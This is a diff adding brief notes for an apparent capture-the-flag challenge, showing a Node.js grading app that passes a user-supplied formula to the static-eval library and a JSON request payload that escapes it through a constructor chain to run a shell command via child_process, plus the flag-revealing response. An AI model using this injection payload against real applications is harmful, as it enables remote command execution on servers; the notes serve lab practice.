@@ -1,0 +1,46 @@
+some arbitraty code rce.
+
+access:
+http://144.126.206.249:32569/
+
+take atteniton code:
+if (StudentHelper.isDumb(student.name) || !StudentHelper.hasPassed(student, formula)) {
+    return res.send({
+        'pass': 'n' + randomize('?', 10, {chars: 'o0'}) + 'pe'
+    });
+}
+
+hasPassed({ exam, paper, assignment }, formula) {
+    let ast = parse(formula).body[0].expression;
+    let weight = evaluate(ast, { exam, paper, assignment });
+
+    return parseFloat(weight) >= parseFloat(10.5);
+}
+
+some rce on const evaluate = require('static-eval'); library:
+access: https://github.com/browserify/static-eval/commit/0bcd9dc93f42898dfd832a10915a4544e11b8f13
+
+send this on resquest payload:
+{
+  "name": "test",
+  "exam": "0",
+  "paper": "0",
+  "assignment": "1",
+  "formula": "(function (y){return ''[y?y:'length'][y]})('constructor')('throw new TypeError(process.mainModule.require(\"child_process\").execSync(\"cat flagopDu5\").toString())')()"
+}
+
+response:
+TypeError: HTB{f33l1ng_4_l1ttl3_blu3_0r_m4yb3_p1nk?...you_n33d_to_b3h4v'eval!!}
+    at eval (eval at walk (/app/node_modules/static-eval/index.js:96:27), <anonymous>:1:7)
+    at walk (/app/node_modules/static-eval/index.js:96:27)
+    at module.exports (/app/node_modules/static-eval/index.js:175:7)
+    at Object.hasPassed (/app/helpers/StudentHelper.js:11:22)
+    at /app/routes/index.js:22:62
+    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
+    at next (/app/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
+    at /app/node_modules/express/lib/router/index.js:281:22
+
+resource:
+https://hilb3r7.github.io/walkthroughs/babybreakinggrad.html
